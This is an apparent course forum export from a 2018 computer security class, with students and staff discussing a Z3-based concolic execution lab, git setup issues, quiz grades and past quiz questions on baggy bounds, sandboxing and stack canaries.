<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    (Length(s) &gt; 30) == False,</p>
<p>    Not((Concat(s, s) == &#34;xyxy&#34;) == False))</p>
<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    (Length(s) &gt; 30) == False,</p>
<p>    (Concat(s, s) == &#34;xyxy&#34;) == False)</p>
<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    (Length(s) &gt; 30) == False,</p>
<p>    (Concat(s, s) == &#34;xyxy&#34;) == False,</p>
<p>    Not(StartsWith(s, &#34;start&#34;) == False))</p>
<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    (Length(s) &gt; 30) == False,</p>
<p>    (Concat(s, s) == &#34;xyxy&#34;) == False,</p>
<p>    StartsWith(s, &#34;start&#34;) == False)</p>
<p>&#96;&#96;&#96;</p></div>
<h3>Followup Response</h3>
<div><p>Er sorry I&#39;m not sure what you mean - are you only including a subset of the conditions in your constraints? </p></div>
<h3>Followup Response</h3>
<div><p>My mistake in concolic_force_branch was not stopping after negating the bth thing. Like, I would And *all* the conditions (negating the bth one), when should have just And-ed just the constraints up to b.<br /><br />The constraint you posted made me think you made the same mistake, since you&#39;re negating the xyxy condition, but you still have latter conditions (startswith start, endswith end, not length &lt; 4) And-ed into your constraint.<br /><br />Could this be your issue?</p></div>
<h3>Followup Response</h3>
<div><p>Omg yes that was my issue! Thank you so much I would not have thought of that... </p></div>
<h3>Followup Response</h3>
<div><p>Yay! Wait same. I&#39;m grateful I have a smart friend who did it the right way the first time :p </p></div><hr><h1>Exercise 5 Branching Hint?</h1>
<h3>2018-03-29T21:13:37Z</h3>
<div><p>I&#39;ve been looking at this code in check-symex-int.py for a while and I&#39;m struggling to figure out the approach it is taking to trying to make every branch.</p>
<p></p>
<pre>for i in range(0, 6):
    constr = fuzzy.concolic_force_branch(i, test_branches, test_branches_callers, verbose=3)
    for j in range(0, i):
        (ok, _) = fuzzy.fork_and_check(fuzzy.sym_and(constr, fuzzy.sym_not(test_branches[j])))
    (ok, _) = fuzzy.fork_and_check(fuzzy.sym_and(constr, test_branches[i]))</pre>
<p></p>
<p>Specifically I&#39;m struggling with the definition of concolic_force_branch, which talks about negating branch b, but just doing that doesn&#39;t seem to be enough to create all the branches. Can I get a hint as to what the above code is trying to do to point me in the direction of what concolic_force_branch needs to do?</p>
<p></p>
<p>Additionally, is this list correct as to the branches this test is trying to explore? (not necessarily checked in order):</p>
<p>a == 5</p>
<p>! a == 5</p>
<p>a == 5 AND b &lt; 10</p>
<p>(! a == 5) AND b &lt; 10</p>
<p>a == 5 AND (! b &lt; 10)</p>
<p>(! a == 5) AND (! b &lt; 10)</p>
<p>... continuing with the rest of the conditions.</p></div>
<h2>Staff Answer</h2>
<div>You are right that negation on b-th isn’t enough to create all branches, but that concolic_force... function only need negation on b-th.<div><br /></div><div>You will use this function to create all branch later in exercise 6z</div></div><hr><h1>Exercise 8</h1>
<h3>2018-03-29T02:29:42Z</h3>
<div><p>For Exercise 8, my tests are failing because the code can never find a primary key equal to the inputted primary key. For example, in the second test case I have: </p>
<p></p>
<p>primary_key = 0</p>
<p>r.__table__.primary_key.columns.keys()[0] = &#39;name&#39;,  where I get r from looping through rows = query.all()</p>
<p></p>
<p>I looked at the code for mk_int and mk_str and it looks like if an id is not in concrete_values then it is automatically &#34;&#34; or 0. However I&#39;m not sure what to look into beyond this, because I don&#39;t see where &#34;s&#34; and &#34;x&#34; should have been added to concrete values previously. Am I approaching exercise 8 incorrectly, or is there something wrong with my code from previous parts?  </p></div>
<h2>Student Answer</h2>
<div><p>I think the hint is a bit deceptive (I got really tripped up on this too). When you find what the primary key is, you actually want to get the value associated with the primary key and compare it with primary_key input to the get function.</p>
<p></p>
<p>You can use getattr(object, attribute) (where attribute is the name of the primary key) to get the associated value for a given row, which is what you want.</p></div>
<h2>Followup</h2>
<div><p>This helps a lot, thank you! What do you compare to the input primary_key though? Since the only primary keys I&#39;m getting as inpt are 0 and &#39;&#39; and im not sure what to compare that to... </p></div>
<h3>Followup Response</h3>
<div><p>Nevermind I figured this out</p></div>
<h2>Followup</h2>
<div><p>Indeed, r.__table__.primary_key.columns.keys()[0] is just returning the string &#34;name&#34; for all the rows. Is this a typo in the lab?</p></div>
<h3>Followup Response</h3>
<div><p>Oh, I get it, they say you can find the &#34;name of its primary key&#34;, not necessarily meaning the primary key itself. For that you need getattr().</p></div>
<h2>Followup</h2>
<div><p>Should we be using &#39;mk_str/int&#39; or &#39;add&#39;, since we know both the id and value? Also, where does using &#39;oldget&#39; come into play? My thoughts were just a re-implementation.</p></div>
<h3>Followup Response</h3>
<div><p>Nvm, apparently I didn&#39;t have to do either of these! If we&#39;re just looping through and returning the answer when we get a match, how is this in a symbolic-friendly way? I don&#39;t see how we are incorporating the symbolic logic in this exercise.</p></div><hr><h1>Can&#39;t Get to Lab3 Code</h1>
<h3>2018-03-28T21:29:00Z</h3>
<div><p>When I pull and run the command</p>
<p></p>
<pre>git checkout -b lab3 origin/lab3</pre>
<p></p>
<p>I get the following error instead of the message I&#39;m supposed to get</p>
<pre>warning: refname &#39;origin/lab3&#39; is ambigious.<br />fatal: Ambiguous object name: &#39;origin/lab3&#39;</pre>
<p></p>
<p>Am I not starting on the correct branch? I&#39;m currently on lab2 branch and seem to have pulled everything.</p>
<p></p></div>
<h2>Staff Answer</h2>
<div>Hm, weird seems to work for me locally, can you check if you maybe have a local branch called origin/lab3? That could create the ambiguousness.</div>
<h2>Followup</h2>
<div><p>Oh I think that is in fact the case, is there any way to get rid of the local branch? I must&#39;ve typed a command in wrong somewhere...</p></div>
<h3>Followup Response</h3>
<div>git branch -d origin/lab3 </div>
<h3>Followup Response</h3>
<div><p>Thanks so much! It&#39;s working now!</p></div><hr><h1>Is there no reading question for April 4?</h1>
<h3>2018-03-27T22:58:37Z</h3>
<div><p>Just double checking.</p></div>
<h2>Followup</h2>
<div><p>Speaking of which, why is April 4 <b>REC 1</b> (as opposed to LEC?). Is it still held in the same rooms? Is it taught by the TAs rather than the professors?</p></div>
<h3>Followup Response</h3>
<div><p>REC 1 will be taught by me in the same room.</p></div>
<h2>Staff Answer</h2>
<div><p>Indeed, no reading question.  The recitation will go over material that is important for lab 4.</p></div><hr><h1>Unsolvable constraints even for addition</h1>
<h3>2018-03-27T17:26:53Z</h3>
<div><p>For exercise 2, I tried changing the test to use addition instead of multiplication:</p>
<pre>try:<br />    fuzzy.cur_path_constr = []<br />    fuzzy.cur_path_constr_callers = []<br /><br />    concrete_values = fuzzy.ConcreteValues()<br />    concrete_values.add(&#39;x&#39;, 10)<br />    concrete_values.mk_global()<br /><br />    x = fuzzy.mk_int(&#39;x&#39;)<br />    y = x &#43; 2<br />    if not isinstance(y, fuzzy.concolic_int):<br />        raise MyException(&#34;ERROR: lost concolic object after multiply&#34;)<br />    if y != 12:<br />        raise MyException(&#34;ERROR: wrong concrete value for concolic object&#34;)<br />    if len(fuzzy.cur_path_constr) == 0:<br />        raise MyException(&#34;ERROR: no path constraint from equality check&#34;)<br />    if len(fuzzy.cur_path_constr) &gt; 1:<br />        raise MyException(&#34;ERROR: too many path constraints from equality check&#34;)<br />    fuzzy.cur_path_constr = []<br />    if y == 70:<br />        raise MyException(&#34;ERROR: wrong concrete value for concolic object, take 2&#34;)<br />    (ok, model) = fuzzy.fork_and_check(fuzzy.sym_not(fuzzy.cur_path_constr[0]))<br />    if ok != z3.sat:<br />        raise MyException(&#34;ERROR: unsolvable constraint&#34;)<br />    if model[&#39;x&#39;] != 68:<br />        raise MyException(&#34;ERROR: wrong value in solved constraint&#34;)<br />    print &#34;Addition works&#34;<br />except MyException:<br />    traceback.print_exc(None, sys.stdout)</pre>
<p>but it still does not work</p>
<p></p>
<p>Code for addition is provided in symex/fuzzy.py (staff code, not ours), so I don&#39;t know why it&#39;s not working even for that...</p>
<p></p>
<p>Was there something else we needed to change for exercise 2 other than the 2 places in symex/fuzzy.py denoted by comments?</p></div>
<h2>Staff Answer</h2>
<div>You shouldn’t need to modify more than those two sections specified in comments. I’m not sure what’s wrong with it without implementation. I might be able to help if you can post privately on how you approach it.</div><hr><h1>Exercise numbering things</h1>
<h3>2018-03-27T04:49:35Z</h3>
<div><p>Sorry for this somewhat nitpicky post, but I just wanted to clear up some potential misnumberings that have been confusing me a bit:<br /><br />- the comments in symex/symsql.py say &#34;exercise 5.&#34; I&#39;m guessing you meant ex. 8?</p>
<p>- in check_lab3.py, in the check_symex_zoobar() function, the first if-statement prints &#34;exercise 8.&#34; Should this say ex 9?</p>
<p>- ex 9 and 10 on the website both say &#34;Recall that our check for exercise 3...&#34; Do you mean ex 6? (From past years&#39; lab handouts, ex 3 seems to be our ex 6)<br /><br />Thanks!</p></div>
<h2>Staff Answer</h2>
<div>Thanks I fixed the exercise numbers. Let us know if you catch anything else :)</div>
<h2>Followup</h2>
<div><p></p><pre>Exercise 9. Add invariant checks to check-symex-zoobar.py to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment Exercise 9: your code here to see where you should write this code. When you detect a zoobar balance mismatch, call the report_balance_mismatch() function. When you detect zoobar theft, call report_zoobar_theft().
Recall that our check for exercise 6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercise 3 correctly, so you may need to go back and fix it.
Exercise 10. Fix the two bugs you found in Exercise 9, by copying whatever .py files you need to modify from the zoobar directory to zoobar-fixed and changing them there.
Recall that our check for exercise 3, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercise 3 correctly, so you may need to go back and fix it.

To check whether your solution works correctly, you need to run ./check-symex-zoobar-fixed.sh and see whether the output still contains the messages Exception: eval injection, WARNING: Balance mismatch detected and WARNING: Zoobar theft detected. Alternatively, you can run make check, which will do this for you.</pre>
<p>It seems the typos for exercise 9 and 10 are still there...</p></div><hr><h1>Exercise 5</h1>
<h3>2018-03-26T06:57:05Z</h3>
<div><p># Note that some of the AST combinators take separate positional<br /> # arguments. In Python, to unpack a list into separate positional<br /> # arguments, use the &#39;*&#39; operator documented at<br /> # <a href="https://docs.python.org/2/tutorial/controlflow.html#unpacking-argument-lists">https://docs.python.org/2/tutorial/controlflow.html#unpacking-argument-lists</a></p>
<p></p>
<p>My code doesn&#39;t pass the test because I&#39;m only using sym_not to negate the b-th branch condition. But I&#39;m really not sure what this hint is referring to. Could someone explain why sym_not is not enough?</p></div>
<h2>Staff Answer</h2>
<div>Sym_not is a unary operator, which you want to apply to a list of branches combined with some other binary operator. Going from list to function arguments is what the hint is referring to.</div><hr><h1>What are the symbolic simplifications?</h1>
<h3>2018-03-26T05:13:33Z</h3>
<div><p>I&#39;m not sure what</p>
<pre>class patname(sym_ast):
  def __init__(self, name, pattern = None):
    self.name = name
    self.pattern = pattern

simplify_patterns = [
  (sym_substring(patname(&#34;a&#34;,
                         sym_substring(patname(&#34;b&#34;),
                                       patname(&#34;c&#34;),
                                       sym_minus(sym_length(patname(&#34;b&#34;)),
                                                 patname(&#34;c&#34;)))),
                 patname(&#34;d&#34;),
                 sym_minus(sym_length(patname(&#34;a&#34;)),
                           patname(&#34;d&#34;))),
   sym_substring(patname(&#34;b&#34;),
                 sym_plus(patname(&#34;c&#34;), patname(&#34;d&#34;)),
                 sym_minus(sym_length(patname(&#34;b&#34;)),
                           sym_plus(patname(&#34;c&#34;), patname(&#34;d&#34;))))
  ),
  (sym_concat(patname(&#34;a&#34;), const_str(&#34;&#34;)),
   patname(&#34;a&#34;)
  ),
]</pre>
<p>is doing? Is this just talking about string identities like a &#43; &#34;&#34; == a, and len(a) &#43; len(b) == len(a&#43;b)? Does z3str not know about these string identities?</p></div>
<h2>Staff Answer</h2>
<div>Yep, Z3 doesn’t make any assumptions about string relations, this code makes these explicit and Z3 proves their Satisfiability. </div><hr><h1>how to debug MyException: ERROR: unsolvable constraint?</h1>
<h3>2018-03-26T02:05:53Z</h3>
<div><p>I got </p>
<pre>MyException: ERROR: unsolvable constraint</pre>
<p>for all 3 tests in exercise 2.</p>
<p></p>
<p>I&#39;m not sure how to debug this; I followed the format for plus and minus for divide and multiply, so it should be working. I don&#39;t know what I did wrong.</p>
<p></p>
<p>In the tests, it&#39;s this line</p>
<pre>    if ok != z3.sat:
        raise MyException(&#34;ERROR: unsolvable constraint&#34;)</pre>
<p>but I&#39;m not sure what I should do about that.</p>
<p></p>
<p>I guess this means that the SMT didn&#39;t find a solution for x * 2 == 70, but is there a good way to debug why that happens?</p></div>
<h2>Followup</h2>
<div><p>update: I changed multiply to addition and it still doesn&#39;t work. So it&#39;s not just my new additions that have a problem, even addition (which was already there) doesn&#39;t work...</p></div>
<h2>Staff Answer</h2>
<div>Z3 generates test cases when the result is unsatisfiable, try z3.model()</div>
<h2>Followup</h2>
<div><p>But Z3 only generates test cases when the model is <em>satisfiable</em>, not when it&#39;s <em>unsatisfiable</em>. If I print model, then I get {}.</p></div><hr><h1>What operations are allowed for exercise 1?</h1>
<h3>2018-03-25T22:26:08Z</h3>
<div><p>Is z3.If allowed, for instance? Or are only arithmetic/bit operations allowed?</p></div>
<h2>Staff Answer</h2>
<div>Everything is allowed.</div>
<h2>Student Answer</h2>
<div><p>Oh, I wish I&#39;d known that there was an if statement. You can definitely do this in one line without it, though, if anybody is wondering (not sure about for the challenge; I didn&#39;t attempt that one); it&#39;s not very hard, though you may well think of a solution using an if statement more quickly.</p></div><hr><h1>ImportError: No module named symex.z3str</h1>
<h3>2018-03-25T21:39:25Z</h3>
<div><p>I got</p>
<pre>ImportError: No module named symex.z3str</pre>
<p>and</p>
<pre>ImportError: No module named z3</pre>
<p>What should I do?</p></div>
<h2>Student Answer</h2>
<div><p>nvm, resolved</p></div><hr><h1>final project - teaming up</h1>
<h3>2018-03-23T12:55:49Z</h3>
<div><p>Hello Everyone,</p>
<p></p>
<p>I&#39;d like explore opportunities for improving security and reliability of Etherium-based smart contracts using static-code analysis techniques. If you have similar interests, please let me know, we can team up and collaborate.</p>
<p></p>
<p>Regards,</p>
<p>Ilya</p></div>
<h2>Staff Answer</h2>
<div><p>Hi Ilya,  I just enable search teammate option for everyone after seeing your post in case you want to use that tool as well but this should be fine :) </p></div>
<h2>Followup</h2>
<div><p>See <a href="https://blog.trailofbits.com/2018/03/23/use-our-suite-of-ethereum-security-tools/" target="_blank">https://blog.trailofbits.com/2018/03/23/use-our-suite-of-ethereum-security-tools/</a></p></div><hr><h1>Can we get the statistics for the first quiz?</h1>
<h3>2018-03-22T23:58:14Z</h3>
<div><p>Usually classes release mean, median, and standard deviation for the quizzes. Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>they&#39;re on the first page of the solutions</p></div><hr><h1>What are grade cutoffs like in this class?</h1>
<h3>2018-03-22T22:13:22Z</h3>
<div><p>Asking because of first midterm results. </p></div>
<h2>Staff Answer</h2>
<div><p>Related to &#64;410. It&#39;s hard to guess, and we won&#39;t know until the end.</p></div><hr><h1>Quiz 1 Grade Cutoffs/Distribution</h1>
<h3>2018-03-22T21:43:32Z</h3>
<div><p>What were the grade cutoffs/distribution for the first quiz?</p></div>
<h2>Staff Answer</h2>
<div><p>Undefined -- we don&#39;t assign letter grades for quizzes.</p></div><hr><h1>Quiz 1 grades and solutions posted</h1>
<h3>2018-03-22T21:40:49Z</h3>
<div><p>We have posted the quiz 1 grades (on the submission web site) and the quiz 1 solutions:</p>
<p></p>
<p>  <a href="http://css.csail.mit.edu/6.858/2018/quiz/q18-1-sol.pdf" target="_blank">http://css.csail.mit.edu/6.858/2018/quiz/q18-1-sol.pdf</a></p></div>
<h2>Followup</h2>
<div><p>Is there somewhere to pick up our quizzes/a way to request regrades? </p></div>
<h3>Followup Response</h3>
<div><p>You can pick up your quiz with Nickolai or me, or ask one of the TAs.  During spring break, we may not be around every day.   If we made a grading mistake, we will be happy to review your answer and our grading of it.</p>
<p></p></div>
<h3>Followup Response</h3>
<div>Would we be able to pick them up after spring break (after class/office hours)?</div>
<h3>Followup Response</h3>
<div><p>Yes, of course.</p></div><hr><h1>Fall 2017 Baggy Bounds Question 6</h1>
<h3>2018-03-21T15:33:17Z</h3>
<div><p>Why is the high order bit not set here?</p>
<p></p>
<p>We&#39;re adding 30 to the location 0x10203040 and slot size is only 16. Adding 30 bytes takes us significantly past slot size, so the pointer should be marked OOB right?</p>
<p></p>
<p></p></div>
<h2>Student Answer</h2>
<div><p>sizeof(struct foo) = 4 &#43; 4 &#43; 4 &#43; 12 = 24. But malloc rounds this to an even 32 bytes - which is what baggy bounds takes advantage of and it uses the 32 bytes when checking OOB (it doesn&#39;t know the actual size of the struct - just the amount of space allocated to it).</p></div>
<h2>Followup</h2>
<div><p>Ohhhh Ok. Thank you. Now if the struct was 34 bytes, it would be rounded to 64 bytes, yes? And then allocated 4 slots, each of slot_size:16 bytes by Baggy Bounds?</p></div>
<h3>Followup Response</h3>
<div><p>Yes. </p></div>
<h3>Followup Response</h3>
<div><p>Since slot size is still only 16, if we went to byte 70, the OOB would not be set, but if we went to byte 73 the OOB would be set, yes? Because 64 &#43; half slot size = 72.</p></div><hr><h1>2011 Sec III Question 6</h1>
<h3>2018-03-21T13:41:16Z</h3>
<div><p>The setting is we have a directory /db which has permission 777. We have subdirectories /db/zoobars.u1 and /db/zoobars.u2. Subdirectories are owned by some special UID and have permission 700.</p>
<p></p>
<p>The solution says we can rename /db/zoobars.u1 to /db/zoobars.tmp, then create a new /db/zoobars.u1. However, I got &#96;permission denied&#96; when I test that on MacOS. </p>
<p></p>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>I&#39;m not sure what is going on there. Sometimes Macs have funky ways of enforcing permissions. It should work on Linux?</p></div><hr><h1>2015 quiz 2, problem 13</h1>
<h3>2018-03-21T07:15:30Z</h3>
<div><p>Even if we store unvalidated instructions in a buffer, isn&#39;t the sandbox supposed to be marked as non-writable, so this shouldn&#39;t be possible? (Or did I slightly misunderstand the question, and the whole point is that this exploit with munmap makes the sandbox &#34;writable&#34; in some sense?)</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>Why would the whole sandbox be non-writable? If that were the case, anything inside the sandbox can&#39;t perform any writes as long as we have an unvalidated buffer. </p></div>
<h2>Followup</h2>
<div>What about non-executable after the code gets loaded? <div><br /></div></div>
<h3>Followup Response</h3>
<div><p>I&#39;m not too sure what you mean, but even if the buffer were non-executable. It is still being mmapped to memory can be executed. </p></div><hr><h1>2013 Quiz 1, Q2</h1>
<h3>2018-03-21T06:33:09Z</h3>
<div><p>Why does line 7 not throw an error?  What happens at line 7?</p>
<pre>1. char *p, *q;
2. char *a, *b, *c, *d, *e, *f;
3.
4. p = malloc(48);
5. q = malloc(16);
6.
7. a = p &#43; 46;
8. b = a &#43; 10;
9. *b = ’\0’;
10. c = b &#43; 10;
11. d = c &#43; 10;
12. e = d - 32;
13. *e = ’\0’;
14.
15. p = q;
16. f = p &#43; 8;</pre>
<p></p></div>
<h2>Student Answer</h2>
<div><p>I don&#39;t see why line 7 would have an issue since 46 &lt; 48 even, so it&#39;s still &#39;in bounds&#39; by our original, strict definition.</p>
<p></p>
<p>here, line 11 throws an error because the index of d (76) goes OOB by more than slot_size/2. We also see that c is marked OOB (set to high-memory), but that doesn&#39;t cause any errors because it&#39;s not dereferenced.</p></div><hr><h1>2015 Q10</h1>
<h3>2018-03-21T06:13:22Z</h3>
<div>Why can&#39;t  Capsicum prevent the modification of portfolio if we only supply CAPS_READ?</div>
<h2>Student Answer</h2>
<div><p>Since epopt needs to overwrite the portfolio after calculating a better one, it needs to have CAP_WRITE as well.</p></div><hr><h1>2010 quiz 1 problem 13 (okws)</h1>
<h3>2018-03-21T05:44:42Z</h3>
<div><p>How would using kill or ptrace allow a compromised service to take over another service running under the same UID?</p></div>
<h2>Student Answer</h2>
<div><p><a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/kill.html">http://pubs.opengroup.org/onlinepubs/009695399/functions/kill.html</a></p>
<p></p>
<blockquote>
<p>For a process to have permission to send a signal to a process designated by <i>pid</i>, unless the sending process has appropriate privileges, the real or effective user ID of the sending process shall match the real or saved set-user-ID of the receiving process.</p>
<p></p>
</blockquote></div><hr><h1>2011 Problem 4 Baggy Bounds</h1>
<h3>2018-03-21T04:53:33Z</h3>
<div><p>Why does f take up 4 bytes? </p></div>
<h2>Student Answer</h2>
<div><p>f is a pointer and in 32-bit systems pointers are 4 bytes in size.</p></div><hr><h1>Stack Canary Location</h1>
<h3>2018-03-21T04:29:54Z</h3>
<div><p>In the lecture notes, it says that the stack canary is placed before the ebp, but in the baggy bounds review notes and wikipedia, it says that the stack canary is placed before the return address. Which is correct?</p></div>
<h2>Staff Answer</h2>
<div><p>I&#39;m unsure either due to inconsistence I also found. Could be varied by compiler design or assembly calling convention? However, you don&#39;t have to worry much about that but the goal is it will always come before return to try to protect the return address (before ebp also mean before return but not immediately before). </p></div>